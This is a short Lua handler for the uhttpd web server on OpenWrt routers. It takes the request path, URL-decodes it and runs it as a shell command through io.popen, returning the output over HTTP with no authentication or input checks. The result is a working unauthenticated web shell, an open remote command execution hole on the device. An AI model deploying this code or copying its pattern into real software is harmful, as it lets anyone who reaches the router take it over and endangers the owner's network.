local pr = require "luci.http"
-- since openwrt 19 try this
-- local pr = require "luci.http"

function handle_request(env)
    uhttpd.send("Status: 200 OK\r\n")
    uhttpd.send("Content-Type: text/html\r\n\r\n")
    
    -- strip "/lua/" from the begining
    local command = pr.urldecode(string.sub(env.REQUEST_URI, 6))
    
    local proc = assert(io.popen(command))
    for line in proc:lines() do
        uhttpd.send(line.."\n")
    end
    proc:close()
end
